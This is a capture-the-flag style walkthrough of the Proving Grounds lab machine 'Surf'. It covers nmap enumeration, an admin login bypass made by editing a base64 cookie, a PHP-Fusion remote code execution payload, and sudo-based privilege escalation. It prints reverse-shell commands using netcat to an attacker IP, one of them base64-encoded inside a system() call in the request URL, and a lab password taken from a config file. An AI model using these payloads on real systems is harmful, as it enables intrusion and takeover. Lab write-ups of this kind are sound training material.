#### Enumeration

```
# Nmap 7.91 scan initiated Sun Nov 14 05:24:04 2021 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /home/kali/Documents/OffSecPG/Surf/AutoRecon/results/192.168.73.171/scans/_full_tcp_nmap.txt -oX /home/kali/Documents/OffSecPG/Surf/AutoRecon/results/192.168.73.171/scans/xml/_full_tcp_nmap.xml 192.168.73.171
Increasing send delay for 192.168.73.171 from 0 to 5 due to 11 out of 11 dropped probes since last increase.
Increasing send delay for 192.168.73.171 from 5 to 10 due to 11 out of 22 dropped probes since last increase.
Warning: 192.168.73.171 giving up on port because retransmission cap hit (6).
Nmap scan report for 192.168.73.171
Host is up, received user-set (0.21s latency).
Scanned at 2021-11-14 05:24:05 EST for 1150s
Not shown: 65529 closed ports
Reason: 65529 resets
PORT      STATE    SERVICE REASON         VERSION
22/tcp    open     ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGGcX/x/M6J7Y0V8EeUt0FqceuxieEOe2fUH2RsY3XiSxByQWNQi+XSrFElrfjdR2sgnauIWWhWibfD+kTmSP5gkFcaoSsLtgfMP/2G8yuxPSev+9o1N18gZchJneakItNTaz1ltG1W//qJPZDHmkDneyv798f9ZdXBzidtR5/+2ArZd64bldUxx0irH0lNcf+ICuVlhOZyXGvSx/ceMCRozZrW2JQU+WLvs49gC78zZgvN+wrAZ/3s8gKPOIPobN3ObVSkZ+zngt0Xg/Zl11LLAbyWX7TupAt6lTYOvCSwNVZURyB1dDdjlMAXqT/Ncr4LbP+tvsiI1BKlqxx4I2r
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCpAb2jUKovAahxmPX9l95Pq9YWgXfIgDJw0obIpOjOkdP3b0ukm/mrTNgX2lg1mQBMlS3lzmQmxeyHGg9+xuJA=
|   256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE0omUJRIaMtPNYa4CKBC+XUzVyZsJ1QwsksjpA/6Ml+
80/tcp    open     http    syn-ack ttl 63 Apache httpd 2.4.38 ((Debian))
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Surfing blog
25803/tcp filtered unknown no-response
40073/tcp filtered unknown no-response
42514/tcp filtered unknown no-response
58164/tcp filtered unknown no-response
Aggressive OS guesses: Linux 2.6.32 (91%), Linux 2.6.39 (91%), Linux 3.10 - 3.12 (91%), Linux 3.4 (91%), Linux 3.5 (91%), Linux 4.4 (91%), Synology DiskStation Manager 5.1 (91%), Linux 2.6.35 (90%), Linux 3.10 (90%), Linux 2.6.32 or 3.10 (90%)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=11/14%OT=22%CT=1%CU=41788%PV=Y%DS=2%DC=T%G=Y%TM=6190E8
OS:43%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10C%TI=Z%II=I%TS=A)OPS(O1=
OS:M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7
OS:%O6=M506ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y
OS:%DF=Y%T=40%W=FAF0%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD
OS:=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=
OS:)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G
OS:%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 3.956 days (since Wed Nov 10 06:47:01 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=264 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   209.35 ms 192.168.49.1
2   208.30 ms 192.168.73.171

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Nov 14 05:43:15 2021 -- 1 IP address (1 host up) scanned in 1151.78 seconds

```

After browsing for a while, the website looks nothing interesting. We use feroxbuster to discover new content.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Surf/Surf_2021.11.21_11h00m37s_001_.png)

We find a administration directory that is a login page. Using hydra with username ```admin``` to try to brute force a valid credential but failed.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Surf/Surf_2021.11.21_11h01m56s_002_.png)

I use Burp Sutie for further analysis. There is an interesting setting in login page.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Surf/Surf_2021.11.21_11h02m39s_003_.png)

We decode auth_status base64 string and get a string ```{'success':'false'}```. 

![iamge](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Surf/Surf_2021.11.21_11h03m30s_004_.png)

Trying to modify it to bypass the login verification.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Surf/Surf_2021.11.21_13h15m30s_005_.png)

We log in successfully.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Surf/Surf_2021.11.21_13h19m42s_006_.png)

The ```Check Server Status``` page can check that the server where is installed PHP-Fusion is correctly running.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Surf/Surf_2021.11.21_14h00m22s_007_.png)

I found an RCE [vulnerability](https://www.exploit-db.com/exploits/49911) related to PHP-Fusion. Refer to the vulnerability description we create a new request payload to try to get the reverse shell.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Surf/Surf_2021.11.21_14h28m33s_008_.png)

Encoding the connection string to base64 format and make sure to add spaces to avoid ```+``` or ```=```.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Surf/Surf_2021.11.21_15h49m48s_009_.png)

```
echo "nc -e /bin/bash 192.168.49.162 80  " | base64
```

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Surf/Surf_2021.11.21_16h07m15s_010_.png)

We now combine request and base64 strings and modify the request url in Burp Suite.

```
http://127.0.0.1:8080/infusions/downloads/downloads.php?cat_id=${system(base64_decode(bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguNDkuMTYyIDgwICAK))}
```

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Surf/Surf_2021.11.21_16h22m10s_011_.png)

Sending the request to the server and get the shell successfully.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Surf/Surf_2021.11.21_16h31m46s_012_.png)

#### Privilege Escalation

After searching for a while, I find there is a file in ```/var/www/server/administration/config/config.php``` includes the password.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Surf/Surf_2021.11.21_16h55m46s_013_.png)

We use the username ```james``` and password ```FlyToTheMoon213!``` to log in via ssh.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Surf/Surf_2021.11.21_16h57m01s_014_.png)

Running the linpeas script and find james can run follow command as root.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Surf/Surf_2021.11.21_17h02m58s_015_.png)

We have to check the file permission.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Surf/Surf_2021.11.21_17h05m35s_016_.png)

Because user ```www-data``` can modify file. We reconnect to www-data session shell and change the codes. 

```
echo "<?php system(\"nc -e /bin/bash 192.168.49.162 80\"); ?>" >  /var/backups/database-backup.php
```

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Surf/Surf_2021.11.21_17h31m28s_017_.png)

Executing the php file with sudo in ```james``` session shell.

```
sudo /usr/bin/php /var/backups/database-backup.php
```

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Surf/Surf_2021.11.21_17h31m55s_018_.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Surf/Surf_2021.11.21_17h32m21s_019_.png)
